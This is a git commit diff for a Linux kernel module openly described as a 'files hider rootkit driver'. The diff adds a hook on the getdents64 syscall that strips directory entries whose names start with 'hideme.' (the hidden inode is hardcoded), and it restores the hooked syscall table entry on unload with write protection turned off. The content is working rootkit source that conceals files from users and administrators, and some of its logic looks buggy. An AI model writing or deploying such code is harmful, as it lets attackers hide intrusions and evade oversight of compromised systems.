8d31a08ed4c5a76e03e33c24690854dd3b10c8b5
Daniel Gladishev <daniel.gladishev@gmail.com>
2021-12-10 18:27:12 +0200

    hooked getdents64 syscall
    getdents64: done!.

--- hideFiles/driver_hideFiles.c
+++ hideFiles/driver_hideFiles.c
@@ -17,6 +17,10 @@ MODULE_AUTHOR("dan0xcc");
 MODULE_DESCRIPTION("files hider rootkit driver"); 
 MODULE_VERSION("1.00");
 
+#define SECRET "hideme."
+#define SIZE_SECRET \
+    (sizeof(SECRET) - 1)
+
 int (*org_sys_getdents64)(
         struct pt_regs*
     ); 
@@ -35,17 +39,43 @@ params:
     R10: count 
     */  
   
+    /* restore the function pointer to return to original handler */ 
     org_sys_getdents64 = hi.originalFunc; 
+    int ret = org_sys_getdents64(regs); 
 
-    struct linux_dirent64 *cur = (struct linux_dirent64*)regs->si; 
+    if(ret <= 0) 
+        return ret; 
+
+    int offset = 0; 
+    char* cur = (char*)regs->si; 
+    struct linux_dirent64 *next = (struct linux_dirent64*)regs->si; 
+
+    while(offset < ret) 
+    {
+        next = (struct linux_dirent64*)(cur + offset); 
+
+        if(strncmp(next->d_name, SECRET, SIZE_SECRET) == 0) 
+        {
+            /* a poc that shows how we might hide files with the same name but in different dirs, 
+             * since when were applying the hook it will mask everything that starts with our generic name. Thus, we can create a function which takes the inumber and compares it against our secert file, if it's equal we we hide it, if not we return the default state of the directory. *
+            here I just show how it might be working, since I can dump inumber with - ls -i.  
+            */ 
+             
+            if(next->d_ino != 430) 
+                return ret;
+            // here we take the next entry & copy it to our current entry which we've found,
+            memcpy(cur + offset, cur + offset + next->d_reclen, ret - (offset  + next->d_reclen)); 
+            // redfine the return value little bit , so it returns with a differnt state. 
+            ret -= next->d_reclen; 
+            
+        } 
+        
+        /* calc the next entry */ 
+        offset += next->d_reclen;
+            
+    }
     
-    struct linux_dirent64 __user *next;
-    next = (void __user*)cur + cur->d_reclen;
-
-
-    printk(KERN_INFO "file: %s\n", next->d_name); 
-
-    return (*org_sys_getdents64)(regs);  
+    return ret; 
 }
 
 static int __init rootkit_init(void) {
@@ -58,9 +88,10 @@ static int __init rootkit_init(void) {
 }
 
 static void __exit rootkit_exit(void) {
-    
-    printk(KERN_INFO "[*] Unloading LXRootkit...\n"); 
 
+    printk(KERN_INFO "[*] Unloading LXRootkit...\n"); 
+    printk(KERN_INFO "[*] Unhooking...\n");
+    
     wpOFF(); 
     hi.sstb[hi.nr] = hi.originalFunc;  
     wpON(); 
